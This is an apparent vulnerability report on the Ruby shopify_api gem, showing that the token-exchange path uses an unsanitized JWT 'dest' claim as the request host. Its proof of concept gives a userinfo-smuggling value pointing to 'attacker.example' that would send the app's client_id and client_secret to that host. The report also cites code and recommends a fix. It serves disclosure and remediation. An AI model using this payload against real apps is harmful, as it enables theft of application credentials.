### Title
SSRF with app credentials via unvalidated JWT `dest` claim used as OAuth token-exchange host - (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` builds the host that receives the app's `client_id`/`client_secret` directly from the session token's `dest` claim, without passing it through `Utils::ShopValidator.sanitize!` — unlike every other credential-sending code path in this same module and package. Because `JwtPayload#shop` only strips a literal `"https://"` prefix instead of parsing/canonicalizing the URL, a `dest` value containing userinfo syntax (e.g. `https://real-shop.myshopify.com@attacker.example`) is passed straight through to `Clients::HttpClient`, which builds `https://#{session.shop}` and hands it to `URI()`. Ruby's `URI` parser will treat the string before `@` as userinfo and `attacker.example` as the actual connection host, so the POST body carrying `client_id`/`client_secret` is sent to the attacker's host instead of Shopify.

### Finding Description
`JwtPayload#shop` performs no domain validation: [1](#0-0) 

`TokenExchange.exchange_token` uses this unsanitized value as the session's `shop`, which becomes the request host: [2](#0-1) 

Every sibling method that constructs the same kind of credential-bearing request explicitly canonicalizes/validates the shop first via `Utils::ShopValidator.sanitize!`, which is specifically designed to reject userinfo-prefixed hosts (`test_rejects_userinfo_before_at_sign`) and to enforce membership in `TRUSTED_SHOPIFY_DOMAINS`: [3](#0-2) [4](#0-3) [5](#0-4) 

`ShopValidator` guards exactly this class of attack: [6](#0-5) 

The unvalidated `session.shop` is concatenated directly into the request URI/host: [7](#0-6) [8](#0-7) 

This is a break of the identity binding "host validated versus host that receives the `client_secret`": the `exchange_token` code path only validates that the JWT is HS256-signed and that `aud == Context.api_key` — it never validates that the `dest`/`shop` value is a real, trusted Shopify host before using it as the destination for the app's `client_id`/`client_secret`.

### Impact Explanation
If a session token's `dest` claim can ever contain (or be made to contain) a userinfo-style value, `exchange_token` will send the application's `client_id` and `client_secret` — its most sensitive credentials — to an attacker-controlled host. This is SSRF carrying the app's credentials, matching the High-impact criteria in scope. It is also a clear regression relative to the rest of the codebase: the exact protection (`ShopValidator.sanitize!`) exists and is used in `client_credentials.rb`, `refresh_token.rb`, and even the neighboring `migrate_to_expiring_token` method in the same file, but was omitted specifically for `exchange_token`'s JWT-derived shop.

### Likelihood Explanation
Exploitability depends on whether the `dest` claim inside a validly-signed session token can ever take a non-canonical/userinfo form. The JWT signature is verified with the app's `api_secret_key` (`JwtPayload#decode_token`), which the library correctly checks; in Shopify's normal issuance flow, `dest` should always be a clean shop hostname. I could not verify from the library alone whether Shopify's session-token issuance guarantees this format under all circumstances (e.g., non-standard/1P admin hosts, `spin.dev`/`shop.dev` internal hosts, or future format changes) — this is an external assumption outside this gem's code. What is concretely provable from the code is that this call site is the only credential-sending path in the module that skips the sanitization step that was purpose-built to reject exactly this pattern, making it the weakest link if the assumption about `dest`'s format is ever violated.

### Recommendation
In `lib/shopify_api/auth/token_exchange.rb#exchange_token`, pass `jwt_payload.shop` through `Utils::ShopValidator.sanitize!` (or an equivalent that rejects userinfo/path/port components and enforces `TRUSTED_SHOPIFY_DOMAINS` membership) before constructing `shop_session`, mirroring `client_credentials.rb`, `refresh_token.rb`, and `migrate_to_expiring_token`. Additionally, harden `JwtPayload#shop` to parse `dest` with a proper URI parser (e.g. `Addressable::URI`) rather than a literal string `gsub`, so that userinfo, path, and scheme components can't be smuggled into the derived shop value in the first place.

### Proof of Concept
1. Obtain (or assume) a session token whose `dest` claim is `https://real-shop.myshopify.com@attacker.example` and which is otherwise validly signed with the app's `api_secret_key` and has `aud == Context.api_key`.
2. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: token, requested_token_type: ...)`.
3. `JwtPayload#shop` returns `"real-shop.myshopify.com@attacker.example"` (only `"https://"` is stripped).
4. `Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")` sets `@base_uri = "https://real-shop.myshopify.com@attacker.example"`.
5. `URI("https://real-shop.myshopify.com@attacker.example/admin/oauth/access_token")` resolves to host `attacker.example` with userinfo `real-shop.myshopify.com`.
6. The POST request — including `client_id` and `client_secret` in the JSON body — is sent to `attacker.example`, exfiltrating the app's credentials.

### Citations

**File:** lib/shopify_api/auth/jwt_payload.rb (L47-50)
```ruby
      sig { returns(String) }
      def shop
        @dest.gsub("https://", "")
      end
```

**File:** lib/shopify_api/auth/token_exchange.rb (L39-65)
```ruby
          # Validate the session token and use the shop from the token's `dest` claim
          jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
          dest_shop = jwt_payload.shop

          if shop
            ShopifyAPI::Logger.deprecated(
              "The `shop` parameter for `exchange_token` is deprecated and will be removed in v17. " \
                "The shop is now always taken from the session token's `dest` claim.",
              "17.0.0",
            )
          end

          shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: TOKEN_EXCHANGE_GRANT_TYPE,
            subject_token: session_token,
            subject_token_type: ID_TOKEN_TYPE,
            requested_token_type: requested_token_type.serialize,
          }

          if requested_token_type == RequestedTokenType::OFFLINE_ACCESS_TOKEN
            body.merge!({ expiring: ShopifyAPI::Context.expiring_offline_access_tokens ? 1 : 0 })
          end

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/auth/token_exchange.rb (L97-104)
```ruby
        def migrate_to_expiring_token(shop:, non_expiring_offline_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/auth/client_credentials.rb (L19-26)
```ruby
        def client_credentials(shop:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/auth/refresh_token.rb (L18-25)
```ruby
        def refresh_access_token(shop:, refresh_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/utils/shop_validator.rb (L9-18)
```ruby
      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )
```

**File:** lib/shopify_api/clients/http_client.rb (L16-19)
```ruby
        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)
        @base_uri_and_path = T.let("#{@base_uri}#{base_path}", String)
```

**File:** lib/shopify_api/clients/http_client.rb (L43-57)
```ruby
        parsed_uri = URI(request_url(request))

        headers = append_first_party_development_headers(headers, parsed_uri)

        tries = 0
        response = HttpResponse.new(code: 0, headers: {}, body: "")
        while tries < request.tries
          tries += 1
          res = T.cast(HTTParty.send(
            request.http_method,
            parsed_uri.to_s,
            headers: headers,
            query: request.query,
            body: request.body.class == Hash ? T.unsafe(request.body).to_json : request.body,
          ), HTTParty::Response)
```
